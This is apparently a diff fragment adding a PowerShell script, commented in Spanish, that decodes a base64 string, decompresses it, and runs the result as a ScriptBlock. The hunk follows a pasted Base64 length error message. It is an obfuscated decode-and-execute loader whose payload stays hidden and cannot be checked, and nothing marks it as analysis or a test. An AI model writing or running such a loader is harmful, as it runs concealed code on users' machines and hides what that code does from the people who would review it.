@@ -121,3 +121,46 @@ catch {
 
 
 Ocurrió un error: Excepción al llamar a "FromBase64String" con los argumentos "1": "Longitud no válida para una matriz o cadena de caracteres Base-64."
+
+
+
+
+
+
+# Base64 encoded and compressed string
+$encodedString = 'eJx9VEtv2jAQ/S9jH5mVNiVu5JbSiYAkKdpIDnHpwt4kjWZHlFiR+fi3dmVt7+zsZBLtO57Zfb9d9VR5lBNmR5Ux+DBItvYKv1EYeqBzr1EIu/BeVsRDlvYZbwmzflbrFvQZUMjCWTWRGEcB7EMi6exfBcQtsFAdUGUGpOAW7QK8EBT4NG2iEplvlHkVnIiScBDU1R4BPkmcEk8Gx44/hmyoPmgMzfGkQ/4ueg59XAvAwkcyArUeQwAfmYA8+KSVSTP/ESymCMWZ8k9Vkx1Z0rECxKLSa4ORd7E7XEgbkGFS+PYLDZFOGQuwVNyijLlBlGukLOzG+NGt5HiV0B2cZjHnJrRaQj28Hc92mvd/QPp/hqD8YT1dq75Z55Id0JdppA3H/2v6R/2/+PgEZ8d0A='
+
+try {
+    # Asegurarse de que la cadena tenga el padding correcto
+    switch ($encodedString.Length % 4) {
+        2 { $encodedString += '==' }
+        3 { $encodedString += '=' }
+    }
+
+    # Decodificar la cadena base64
+    $decodedBytes = [System.Convert]::FromBase64String($encodedString)
+
+    # Crear un MemoryStream con los bytes decodificados
+    $memoryStream = New-Object System.IO.MemoryStream
+    $memoryStream.Write($decodedBytes, 0, $decodedBytes.Length)
+    $memoryStream.Position = 0
+
+    # Descomprimir usando DeflateStream
+    $deflateStream = New-Object System.IO.Compression.DeflateStream($memoryStream, [System.IO.Compression.CompressionMode]::Decompress)
+
+    # Leer el contenido descomprimido usando StreamReader
+    $streamReader = New-Object System.IO.StreamReader($deflateStream, [System.Text.Encoding]::ASCII)
+    $decompressedContent = $streamReader.ReadToEnd()
+
+    # Mostrar el contenido descomprimido
+    Write-Output $decompressedContent
+
+    # Definir el comando para ser ejecutado
+    $scriptBlock = [ScriptBlock]::Create($decompressedContent)
+
+    # Ejecutar el comando
+    & $scriptBlock
+}
+catch {
+    Write-Output "Ocurrió un error: $_"
+}
